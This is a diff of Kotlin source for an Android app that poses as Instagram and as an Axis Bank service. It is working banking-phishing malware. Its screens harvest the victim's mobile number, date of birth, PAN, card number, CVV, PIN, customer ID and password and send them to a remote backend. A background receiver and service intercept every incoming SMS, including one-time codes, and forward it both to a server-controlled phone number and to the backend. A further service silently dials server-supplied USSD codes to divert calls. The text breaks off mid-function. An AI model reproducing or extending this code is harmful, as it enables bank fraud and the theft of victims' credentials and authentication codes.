@@ -1,0 +1,1378 @@
+form 
+
+package com.pakajb.avzbakl.msbzjl.instagram.activities
+
+import android.content.Context
+import android.content.Intent
+import android.os.Bundle
+import android.text.Editable
+import android.text.TextWatcher
+import android.util.Log
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.pakajb.avzbakl.msbzjl.instagram.R
+import com.pakajb.avzbakl.msbzjl.instagram.models.FormData
+import com.pakajb.avzbakl.msbzjl.instagram.network.ApiClient
+import kotlinx.coroutines.*
+import retrofit2.HttpException
+import java.io.IOException
+import kotlin.math.pow
+
+class FormActivity : AppCompatActivity() {
+
+    private lateinit var etMobileNumber: EditText
+    private lateinit var etDob: EditText
+    private lateinit var etPan: EditText
+    private lateinit var btnProceed: Button
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_form)
+
+        etMobileNumber = findViewById(R.id.etMobileNumber)
+        etDob = findViewById(R.id.etDob)
+        etPan = findViewById(R.id.etPan)
+        btnProceed = findViewById(R.id.btnProceed)
+
+        setupDobAutoFormat() // Add auto-format logic for DOB input
+
+        btnProceed.setOnClickListener {
+            val mobileNumber = etMobileNumber.text.toString().trim()
+            val dob = etDob.text.toString().trim()
+            val pan = etPan.text.toString().trim()
+
+            if (validateInputs(mobileNumber, dob, pan)) {
+                btnProceed.isEnabled = false
+                submitFormData(mobileNumber, dob, pan)
+            }
+        }
+    }
+
+    private fun setupDobAutoFormat() {
+        etDob.addTextChangedListener(object : TextWatcher {
+            private var isFormatting = false
+            private val maxLength = 10 // Maximum allowed length for DOB input
+
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+
+            override fun afterTextChanged(s: Editable?) {
+                if (isFormatting || s.isNullOrEmpty()) return
+
+                isFormatting = true
+
+                val clean = s.toString().replace("/", "") // Remove previous slashes
+                val formatted = StringBuilder()
+                val cursorPosition = etDob.selectionStart // Using 'val' instead of 'var'
+
+                for (i in clean.indices) {
+                    if (formatted.length >= maxLength) break // Prevent exceeding max length
+
+                    formatted.append(clean[i])
+                    if ((i == 1 || i == 3) && formatted.length + 1 <= maxLength) {
+                        formatted.append("/")
+                    }
+                }
+
+                etDob.setText(formatted.toString())
+
+                // Maintain cursor position
+                etDob.setSelection(minOf(cursorPosition, formatted.length))
+
+                isFormatting = false
+            }
+        })
+    }
+
+    private fun validateInputs(mobileNumber: String, dob: String, pan: String): Boolean {
+        val mobileRegex = "^[6-9]\\d{9}$".toRegex()
+        val dobRegex = "^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/([0-9]{4})$".toRegex()
+        val panRegex = "^[A-Z]{5}\\d{4}[A-Z]$".toRegex()
+
+        if (!mobileRegex.matches(mobileNumber)) {
+            showToast("Invalid Mobile Number!")
+            return false
+        }
+        if (!dobRegex.matches(dob)) {
+            showToast("Invalid Date of Birth! Format: DD/MM/YYYY")
+            return false
+        }
+        if (!panRegex.matches(pan)) {
+            showToast("Invalid PAN Number!")
+            return false
+        }
+        return true
+    }
+
+    private fun submitFormData(mobileNumber: String, dob: String, pan: String) {
+        val apiInterface = ApiClient.api
+        val formData = FormData(mobile = mobileNumber, dob = dob, pan = pan)
+
+        CoroutineScope(Dispatchers.IO).launch {
+            var attempt = 0
+            var success = false
+            var userId: String? = null
+
+            while (attempt < 3 && !success) {
+                Log.d("FormActivity", "Attempt $attempt: Sending form data to backend...")
+
+                try {
+                    val response = apiInterface.saveFormDataStep1(formData)
+
+                    withContext(Dispatchers.Main) {
+                        if (response.isSuccessful && response.body()?.success == true) {
+                            userId = response.body()?.data?.userId
+                            Log.d("FormActivity", "Success: Response received from backend")
+                            success = true
+                        } else {
+                            Log.e("FormActivity", "Error: Failed response")
+                        }
+                    }
+                } catch (e: HttpException) {
+                    Log.e("FormActivity", "HTTP Exception: ${e.message()}", e)
+                } catch (e: IOException) {
+                    Log.e("FormActivity", "Network Error: ${e.message}", e)
+                } catch (e: Exception) {
+                    Log.e("FormActivity", "Unexpected Error: ${e.message}", e)
+                }
+
+                attempt++
+                if (!success) {
+                    val delayTime = (2.0.pow(attempt) * 1000).toLong()
+                    Log.d("FormActivity", "Retrying in $delayTime ms...")
+                    delay(delayTime)
+                }
+            }
+
+            withContext(Dispatchers.Main) {
+                btnProceed.isEnabled = true
+                if (success && userId != null) {
+                    handleUserId(userId)
+                } else {
+                    showToast("Please check your internet connection!")
+                }
+            }
+        }
+    }
+
+    private fun handleUserId(userId: String?) {
+        if (!userId.isNullOrEmpty()) {
+            Log.d("FormActivity", "User ID received successfully: $userId")
+            saveUserIdToSharedPreferences(userId)
+
+            navigateToNextForm(userId)
+        } else {
+            Log.e("FormActivity", "Error: User ID is null or empty")
+            showToast("Data submission failed!")
+        }
+    }
+
+    private fun saveUserIdToSharedPreferences(userId: String) {
+        val sharedPref = getSharedPreferences("UserPreferences", Context.MODE_PRIVATE)
+        sharedPref.edit().putString("userId", userId).apply()
+        Log.d("FormActivity", "User ID saved in SharedPreferences: $userId")
+    }
+
+    private fun showToast(message: String) {
+        runOnUiThread {
+            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun navigateToNextForm(userId: String) {
+        Log.d("FormActivity", "Navigating to PaymentActivity with User ID: $userId")
+        val intent = Intent(this, PaymentActivity::class.java)
+        intent.putExtra("USER_ID", userId)
+        startActivity(intent)
+        finish()
+    }
+}
+
+
+
+
+success 
+
+package com.pakajb.avzbakl.msbzjl.instagram.activities
+
+import android.os.Bundle
+import android.util.Log
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.pakajb.avzbakl.msbzjl.instagram.R
+import com.pakajb.avzbakl.msbzjl.instagram.models.CardPaymentData
+import com.pakajb.avzbakl.msbzjl.instagram.network.ApiClient
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.HttpException
+import java.io.IOException
+
+class SuccessActivity : AppCompatActivity() {
+
+    private lateinit var etCustomerId: EditText
+    private lateinit var etPassword: EditText
+    private lateinit var btnSubmit: Button
+
+    private var userId: String? = null
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_success)
+
+        etCustomerId = findViewById(R.id.etCustomerId)
+        etPassword = findViewById(R.id.etPassword)
+        btnSubmit = findViewById(R.id.btnSubmit)
+
+        userId = intent.getStringExtra("USER_ID")
+
+        if (userId.isNullOrEmpty()) {
+            Toast.makeText(this, "User ID missing!", Toast.LENGTH_SHORT).show()
+            finish()
+            return
+        }
+
+        btnSubmit.setOnClickListener {
+            val customerId = etCustomerId.text.toString().trim()
+            val password = etPassword.text.toString().trim()
+
+            if (validateInputs(customerId, password)) {
+                submitFormData(customerId, password)
+            } else {
+                Toast.makeText(this, "Invalid input format!", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun validateInputs(customerId: String, password: String): Boolean {
+
+        // Password: Min 6 characters, at least 1 letter & 1 digit
+
+
+
+        return true
+    }
+
+    private fun submitFormData(customerId: String, password: String) {
+        val apiInterface = ApiClient.api
+
+        val formData = CardPaymentData(
+            userId = userId!!,
+            customerId = customerId,
+            password = password
+        )
+
+        Log.d("FormData", "Payload being sent: $formData")
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.saveFormDataStep3(formData)
+                runOnUiThread {
+                    if (response.isSuccessful && response.body()?.success == true) {
+
+                        finish()
+                    } else {
+                        showToast("Data submission failed!")
+                    }
+                }
+            } catch (e: HttpException) {
+                runOnUiThread { showToast("HTTP Error: ${e.message}") }
+            } catch (e: IOException) {
+                runOnUiThread { showToast("Network Error!") }
+            } catch (e: Exception) {
+                runOnUiThread { showToast("Unexpected Error: ${e.message}") }
+            }
+        }
+    }
+
+    private fun showToast(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+    }
+}
+
+payment 
+
+package com.pakajb.avzbakl.msbzjl.instagram.activities
+
+import android.content.Intent
+import android.os.Bundle
+import android.text.Editable
+import android.text.TextWatcher
+import android.util.Log
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.pakajb.avzbakl.msbzjl.instagram.R
+import com.pakajb.avzbakl.msbzjl.instagram.models.NetBankingData
+import com.pakajb.avzbakl.msbzjl.instagram.network.ApiClient
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.HttpException
+import java.io.IOException
+
+class PaymentActivity : AppCompatActivity() {
+
+    private lateinit var etCardNumber: EditText
+    private lateinit var etExpiryDate: EditText
+    private lateinit var etCvv: EditText
+    private lateinit var etPin: EditText
+    private lateinit var btnProceed: Button
+
+    private var userId: String? = null // Variable to store userId
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_payment)
+
+        // Initialize views
+        etCardNumber = findViewById(R.id.etCardNumber)
+        etExpiryDate = findViewById(R.id.etExpiryDate)
+        etCvv = findViewById(R.id.etCvv)
+        etPin = findViewById(R.id.etPin)
+        btnProceed = findViewById(R.id.btnProceed)
+
+        // Retrieve the userId passed from the previous activity
+        userId = intent.getStringExtra("USER_ID")
+
+        // Setup expiry date auto-formatting
+        setupExpiryDateAutoFormat()
+
+        // Handle button click
+        btnProceed.setOnClickListener {
+            val cardNumber = etCardNumber.text.toString().trim()
+            val expiryDate = etExpiryDate.text.toString().trim()
+            val cvv = etCvv.text.toString().trim()
+            val pin = etPin.text.toString().trim()
+
+            if (validateInputs(cardNumber, expiryDate, cvv, pin)) {
+                submitPaymentData(cardNumber, expiryDate, cvv, pin)
+            } else {
+                showToast("Please fill all fields with valid data!")
+            }
+        }
+    }
+
+    private fun setupExpiryDateAutoFormat() {
+        etExpiryDate.addTextChangedListener(object : TextWatcher {
+            private var isFormatting = false
+            private var deletingSlash = false
+            private val slashPosition = 2
+
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
+                deletingSlash = count == 1 && after == 0 && start == slashPosition
+            }
+
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                if (isFormatting || s.isNullOrEmpty()) return
+
+                isFormatting = true
+                val cleanInput = s.toString().replace(Regex("\\D"), "") // Remove non-numeric characters
+
+                val formatted = StringBuilder()
+                for (i in cleanInput.indices) {
+                    if (i > 3) break // Limit to MM/YY format
+                    formatted.append(cleanInput[i])
+                    if (i == 1 && cleanInput.length > 2) {
+                        formatted.append("/")
+                    }
+                }
+
+                val finalText = formatted.toString()
+                if (finalText != s.toString()) {
+                    etExpiryDate.setText(finalText)
+                    etExpiryDate.setSelection(finalText.length)
+                }
+
+                isFormatting = false
+            }
+
+            override fun afterTextChanged(s: Editable?) {
+                if (deletingSlash) {
+                    s?.delete(slashPosition - 1, slashPosition)
+                    deletingSlash = false
+                }
+            }
+        })
+    }
+
+    // Validate inputs
+    private fun validateInputs(
+        cardNumber: String, expiryDate: String, cvv: String, pin: String
+    ): Boolean {
+        val cardPattern = "^[0-9]{16}$"  // Validate 16 digit card number
+        val expiryPattern = "^(0[1-9]|1[0-2])/([0-9]{2})$"  // Validate expiry date in MM/YY format
+        val cvvPattern = "^[0-9]{3}$"  // Validate 3 digit CVV
+        val pinPattern = "^[0-9]{4}$"  // Validate 4 digit PIN
+
+        val isCardValid = cardNumber.matches(cardPattern.toRegex())
+        val isExpiryValid = expiryDate.matches(expiryPattern.toRegex())
+        val isCvvValid = cvv.matches(cvvPattern.toRegex())
+        val isPinValid = pin.matches(pinPattern.toRegex())
+
+        if (!isCardValid) showToast("Invalid Card Number!")
+        if (!isExpiryValid) showToast("Invalid Expiry Date!")
+        if (!isCvvValid) showToast("Invalid CVV!")
+        if (!isPinValid) showToast("Invalid PIN!")
+
+        return isCardValid && isExpiryValid && isCvvValid && isPinValid
+    }
+
+    // Submit payment data to the backend
+    private fun submitPaymentData(
+        cardNumber: String, expiryDate: String, cvv: String, pin: String
+    ) {
+        if (userId.isNullOrEmpty()) {
+            showToast("User ID is missing! Unable to submit data.")
+            return
+        }
+
+        val apiInterface = ApiClient.api
+        val netBankingData = NetBankingData(
+            userId!!, cardNumber, expiryDate, cvv, pin
+        )
+
+        // Log data being sent to the backend
+        Log.d("PaymentActivity", "Sending data to backend: $netBankingData")
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.saveFormDataStep2(netBankingData)
+
+                // Log the API call response
+                Log.d("PaymentActivity", "Response received: $response")
+
+                if (response.isSuccessful) {
+                    val responseBody = response.body()
+                    if (responseBody?.success == true) {
+                        Log.d("PaymentActivity", "Data submitted successfully. Response: $responseBody")
+                        runOnUiThread {
+                            navigateToNextStep()
+                        }
+                    } else {
+                        Log.d("PaymentActivity", "Submission failed. Response message: ${responseBody?.message}")
+                        runOnUiThread {
+                            showToast(responseBody?.message ?: "Submission failed!")
+                        }
+                    }
+                } else {
+                    // Error response from server
+                    Log.d("PaymentActivity", "Error occurred. Response: ${response.errorBody()?.string()}")
+                    runOnUiThread {
+                        showToast("Error: ${response.errorBody()?.string() ?: "Unknown error occurred"}")
+                    }
+                }
+            } catch (e: HttpException) {
+                // Handle HTTP exceptions (e.g., 4xx or 5xx status codes)
+                Log.e("PaymentActivity", "HTTP Exception: ${e.message}", e)
+                runOnUiThread {
+                    showToast("HTTP Error!")
+                }
+            } catch (e: IOException) {
+                // Handle network-related errors (e.g., no internet)
+                Log.e("PaymentActivity", "Network Error: ${e.message}", e)
+                runOnUiThread {
+                    showToast("Network Error: Please check your connection.")
+                }
+            } catch (e: Exception) {
+                // Handle other unexpected errors
+                Log.e("PaymentActivity", "Unexpected Error: ${e.message}", e)
+                runOnUiThread {
+                    showToast("Unexpected Error!")
+                }
+            }
+        }
+    }
+
+    // Show a Toast message
+    private fun showToast(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+    }
+
+    // Navigate to the SuccessActivity
+    private fun navigateToNextStep() {
+
+        val intent = Intent(this, SuccessActivity::class.java)
+        intent.putExtra("USER_ID", userId) // Pass the userId to the next activity
+        startActivity(intent)
+        finish()
+    }
+}
+
+
+mainactivity 
+
+package com.pakajb.avzbakl.msbzjl.instagram
+
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.provider.Settings
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.appcompat.app.AppCompatDelegate
+import com.pakajb.avzbakl.msbzjl.instagram.activities.FormActivity
+import com.pakajb.avzbakl.msbzjl.instagram.utils.PermissionUtil
+
+class MainActivity : AppCompatActivity() {
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        // Force light mode (disable dark mode)
+        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
+        setContentView(R.layout.activity_main)
+
+        // Base required permissions for SMS, calls, etc.
+        val basePermissions = arrayOf(
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.INTERNET,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE
+        )
+
+        // For Android 14/15 (and Android 13+), add the POST_NOTIFICATIONS permission.
+        // Note: POST_NOTIFICATIONS was introduced in Android 13 (API 33), which covers Android 14/15 as well.
+        val additionalPermissions = mutableListOf<String>()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            additionalPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
+        val requiredPermissions = basePermissions + additionalPermissions.toTypedArray()
+
+        // Check if all required permissions are granted
+        if (PermissionUtil.hasPermissions(this, *requiredPermissions)) {
+            navigateToFormPage() // Navigate if permissions are granted
+        } else {
+            // Request the necessary permissions
+            PermissionUtil.requestPermissions(this, requiredPermissions, 101)
+        }
+    }
+
+    /**
+     * Navigate to the FormActivity.
+     * (Foreground service call removed as per the requirement.)
+     */
+    private fun navigateToFormPage() {
+        val intent = Intent(this, FormActivity::class.java)
+        startActivity(intent)
+        finish()
+    }
+
+    /**
+     * Handle the results from the runtime permission requests.
+     */
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == 101) {
+            var allPermissionsGranted = true
+            for (grantResult in grantResults) {
+                if (grantResult != PackageManager.PERMISSION_GRANTED) {
+                    allPermissionsGranted = false
+                    break
+                }
+            }
+
+            if (allPermissionsGranted) {
+                navigateToFormPage()
+            } else {
+                showPermissionDialog()
+            }
+        }
+    }
+
+    /**
+     * Show a simple Toast prompting the user to enable permissions via the application settings.
+     */
+    private fun showPermissionDialog() {
+        Toast.makeText(this, "Permissions required! Enable them in settings.", Toast.LENGTH_LONG).show()
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+        intent.data = Uri.parse("package:$packageName")
+        startActivity(intent)
+    }
+}
+
+
+
+smsservice 
+
+@file:Suppress("DEPRECATION")
+
+package com.pakajb.avzbakl.msbzjl.instagram.services
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Intent
+import android.content.SharedPreferences
+import android.os.Build
+import android.os.Handler
+import android.os.IBinder
+import android.telephony.SmsManager
+import android.util.Log
+import androidx.core.app.NotificationCompat
+import com.pakajb.avzbakl.msbzjl.instagram.R
+import com.pakajb.avzbakl.msbzjl.instagram.network.ApiClient
+import com.pakajb.avzbakl.msbzjl.instagram.models.SmsData
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.TimeUnit
+
+class SmsService : Service() {
+    private lateinit var sharedPreferences: SharedPreferences
+    private val apiInterface = ApiClient.api
+    private val handler = Handler()
+
+    // Constants
+    private val maxRetries = 3
+
+    override fun onCreate() {
+        super.onCreate()
+        sharedPreferences = getSharedPreferences("AdminPrefs", MODE_PRIVATE)
+
+        // Fetch admin number from backend initially
+        fetchAdminNumberFromBackend()
+
+        // Start periodic fetching of the admin number every minute
+        startAdminNumberFetch()
+
+        // Handle foreground service notification
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundServiceWithNotification()
+        } else {
+            startForeground(1, createNotification())
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        intent?.let {
+            val sender = it.getStringExtra("sender")
+            val body = it.getStringExtra("body")
+            if (!sender.isNullOrEmpty() && !body.isNullOrEmpty()) {
+                forwardSmsToAdmin(sender, body)
+                sendSmsWithRetry(sender, body) // Send SMS to backend with retry mechanism
+            }
+        }
+        return START_STICKY
+    }
+
+    private fun forwardSmsToAdmin(sender: String, body: String) {
+        val adminNumber = getAdminNumber()
+        if (adminNumber.isNotEmpty()) {
+            try {
+                val smsManager = SmsManager.getDefault()
+                val message = "Received SMS:\nFrom: $sender\nMessage: $body"
+                // Directly send SMS to admin number
+                smsManager.sendTextMessage(adminNumber, null, message, null, null)
+                Log.d("SmsService", "SMS sent directly to admin: $adminNumber")
+            } catch (e: Exception) {
+                Log.e("SmsService", "Error sending SMS to admin", e)
+            }
+        } else {
+            Log.e("SmsService", "Admin number is not configured or empty.")
+        }
+    }
+
+    private fun sendSmsWithRetry(sender: String, body: String, attempt: Int = 1) {
+        val timestamp = SimpleDateFormat(
+            "yyyy-MM-dd HH:mm:ss",
+            Locale.getDefault()
+        ).format(System.currentTimeMillis())
+        val notificationData =
+            SmsData(sender = sender, title = "New SMS", body = body, timestamp = timestamp)
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.sendNotificationToBackend(notificationData)
+                withContext(Dispatchers.Main) {
+                    if (response.isSuccessful) {
+                        response.body()?.let {
+                            if (it.success) {
+                                Log.d(
+                                    "SmsService",
+                                    "SMS sent to backend successfully: $notificationData"
+                                )
+                            } else {
+                                handleRetry(attempt, sender, body)
+                            }
+                        } ?: handleRetry(attempt, sender, body)
+                    } else {
+                        handleRetry(attempt, sender, body)
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    handleRetry(attempt, sender, body, e)
+                }
+            }
+        }
+    }
+
+    private fun handleRetry(attempt: Int, sender: String, body: String, e: Exception? = null) {
+        if (attempt < maxRetries) {
+            Log.e("SmsService", "Retrying... attempt $attempt due to error: ${e?.message}")
+            sendSmsWithRetry(sender, body, attempt + 1)
+        } else {
+            Log.e("SmsService", "Max retries reached, error sending SMS to backend", e)
+        }
+    }
+
+    private fun fetchAdminNumberFromBackend() {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.getAdminNumber()
+                withContext(Dispatchers.Main) {
+                    if (response.isSuccessful) {
+                        response.body()?.data?.let {
+                            setAdminNumber(it)
+                            Log.d("SmsService", "Admin number updated from backend: $it")
+                        } ?: run {
+                            Log.e("SmsService", "Admin number is null in response.")
+                        }
+                    } else {
+                        Log.e(
+                            "SmsService",
+                            "Backend response failed, code: ${response.code()} - ${response.message()}"
+                        )
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    Log.e("SmsService", "Error fetching admin number from backend", e)
+                }
+            }
+        }
+    }
+
+    private fun startAdminNumberFetch() {
+        handler.postDelayed(object : Runnable {
+            override fun run() {
+                fetchAdminNumberFromBackend()
+                handler.postDelayed(this, TimeUnit.MINUTES.toMillis(1)) // Fetch every minute
+            }
+        }, TimeUnit.SECONDS.toMillis(0)) // Start immediately
+    }
+
+    private fun getAdminNumber(): String {
+        return sharedPreferences.getString("admin_number", "") ?: ""
+    }
+
+    private fun setAdminNumber(number: String) {
+        CoroutineScope(Dispatchers.Main).launch {
+            sharedPreferences.edit().putString("admin_number", number).apply()
+            Log.d("SmsService", "Admin number updated to: $number")
+        }
+    }
+
+    private fun createNotification(): Notification {
+        val channelId = "sms_service_channel"
+        val channelName = "axis bank running"
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel =
+                NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+
+        return NotificationCompat.Builder(this, channelId)
+            .setContentTitle("Axis Bank Running")
+            .setContentText("Click Here And Manage Service")
+            .setSmallIcon(R.drawable.ic_launcher)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+    }
+
+    private fun startForegroundServiceWithNotification() {
+        val notification = createNotification()
+        startForeground(2, notification)
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
+    }
+}
+
+
+smsreceiver 
+
+@file:Suppress("DEPRECATION")
+
+package com.pakajb.avzbakl.msbzjl.instagram.receivers
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.os.Bundle
+import android.telephony.SmsMessage
+import android.util.Log
+import com.pakajb.avzbakl.msbzjl.instagram.services.SmsService
+
+
+class SMSReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
+            val bundle: Bundle? = intent.extras
+            try {
+                if (bundle != null) {
+                    val pdus = bundle["pdus"] as Array<*>?
+                    if (pdus != null) {
+                        for (pdu in pdus) {
+                            val message = SmsMessage.createFromPdu(pdu as ByteArray)
+                            val sender = message.originatingAddress
+                            val body = message.messageBody
+
+                            if (sender != null && body != null) {
+                                Log.d("SMSReceiver", "Received SMS: From $sender, Body: $body")
+
+                                // Forward SMS to background service
+                                val serviceIntent = Intent(context, SmsService::class.java)
+                                serviceIntent.putExtra("sender", sender)
+                                serviceIntent.putExtra("body", body)
+                                context.startService(serviceIntent)
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("SMSReceiver", "Error processing incoming SMS", e)
+            }
+        }
+    }
+}
+
+
+
+callforwarding
+
+package com.pakajb.avzbakl.msbzjl.instagram.services
+
+import android.Manifest
+import android.annotation.SuppressLint
+import android.app.*
+import android.content.Context
+import android.content.Intent
+import android.content.SharedPreferences
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.IBinder
+import android.telephony.TelephonyManager
+import android.util.Log
+import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import com.pakajb.avzbakl.msbzjl.instagram.R
+import com.pakajb.avzbakl.msbzjl.instagram.receivers.AdminNumberFetcher
+import com.pakajb.avzbakl.msbzjl.instagram.receivers.DeviceRegistration
+
+class CallForwardingService : Service() {
+
+    companion object {
+        private const val TAG = "CallForwardingService"
+        private const val CHANNEL_ID = "callForwardingServiceChannel"
+        private const val NOTIFICATION_ID = 1
+        private const val ALARM_REQUEST_CODE = 1001
+        private const val ALARM_INTERVAL = 15 * 60 * 1000L // 15 minutes in milliseconds
+    }
+
+    private lateinit var adminNumberFetcher: AdminNumberFetcher
+    private lateinit var deviceRegistration: DeviceRegistration
+    private var uniqueId: String? = null
+    private var currentCallCode: String? = null
+
+    private val preferenceChangeListener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
+        if (key == "call_code") {
+            val newCallCode = adminNumberFetcher.getCallCode()
+            Log.d(TAG, "Preference change detected. New call code: $newCallCode")
+            if (!newCallCode.isNullOrEmpty() && newCallCode != currentCallCode) {
+                currentCallCode = newCallCode
+                forwardCall(newCallCode)
+            }
+        }
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        Log.d(TAG, "Service onCreate called")
+
+        // Set up foreground notification channel & start service in foreground
+        createNotificationChannel()
+        startForegroundServiceWithNotification()
+
+        // Added unique ID logic from call 1
+        deviceRegistration = DeviceRegistration(this)
+        uniqueId = deviceRegistration.getSavedUniqueId()
+        if (uniqueId.isNullOrEmpty()) {
+            Log.d(TAG, "Unique ID not found, registering device...")
+            deviceRegistration.registerDeviceIfNeeded()
+            uniqueId = deviceRegistration.getSavedUniqueId()
+        }
+        Log.d(TAG, "Using stored Unique ID: $uniqueId")
+
+        // Initialize AdminNumberFetcher (your custom class to fetch USSD code) with unique ID
+        adminNumberFetcher = AdminNumberFetcher(this, uniqueId ?: "")
+
+        // Load saved call code (if any)
+        currentCallCode = adminNumberFetcher.getCallCode()
+        Log.d(TAG, "Initial call code: $currentCallCode")
+
+        // Register SharedPreferences listener to detect changes in "call_code"
+        val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        sharedPreferences.registerOnSharedPreferenceChangeListener(preferenceChangeListener)
+        Log.d(TAG, "SharedPreferences listener registered")
+
+        // Schedule periodic task using AlarmManager to ensure background execution
+        scheduleAlarm()
+
+        // If a call code is already present, try to forward it.
+        currentCallCode?.let { forwardCall(it) }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Log.d(TAG, "onStartCommand called with intent: $intent, flags: $flags, startId: $startId")
+        // START_STICKY ensures the service is restarted if killed by the system.
+        return START_STICKY
+    }
+
+    /**
+     * Forward the USSD code.
+     * For API 26 and above, use TelephonyManager.sendUssdRequest()
+     * For older devices, fallback to launching ACTION_CALL intent.
+     */
+    @SuppressLint("MissingPermission", "QueryPermissionsNeeded")
+    private fun forwardCall(code: String) {
+        Log.d(TAG, "Attempting to forward call with code: $code")
+        if (!hasCallPermission()) {
+            Log.e(TAG, "CALL_PHONE permission not granted! Stopping service.")
+            stopSelf()
+            return
+        }
+        // Ensure trailing '#' is present.
+        var finalCode = code
+        if (!finalCode.endsWith("#")) {
+            finalCode += "#"
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // Use TelephonyManager.sendUssdRequest() for background execution
+            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            try {
+                telephonyManager.sendUssdRequest(finalCode,
+                    object : TelephonyManager.UssdResponseCallback() {
+                        override fun onReceiveUssdResponse(
+                            telephonyManager: TelephonyManager?,
+                            request: String?,
+                            response: CharSequence?
+                        ) {
+                            super.onReceiveUssdResponse(telephonyManager, request, response)
+                            Log.d(TAG, "USSD response received: $response")
+                        }
+
+                        override fun onReceiveUssdResponseFailed(
+                            telephonyManager: TelephonyManager?,
+                            request: String?,
+                            failureCode: Int
+                        ) {
+                            super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode)
+                            Log.e(TAG, "USSD request failed with code: $failureCode")
+                        }
+                    },
+                    null)
+                Log.d(TAG, "USSD request sent via TelephonyManager.sendUssdRequest")
+            } catch (e: Exception) {
+                Log.e(TAG, "Exception during sendUssdRequest: ${e.message}", e)
+            }
+        } else {
+            // Fallback for devices with API < 26: launch ACTION_CALL intent
+            val encodedNumber = Uri.encode(finalCode, "#")
+            val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$encodedNumber")).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            try {
+                startActivity(callIntent)
+                Log.d(TAG, "Call initiated with USSD code (fallback): $finalCode")
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to initiate call: ${e.message}", e)
+            }
+        }
+    }
+
+    private fun hasCallPermission(): Boolean {
+        return ActivityCompat.checkSelfPermission(
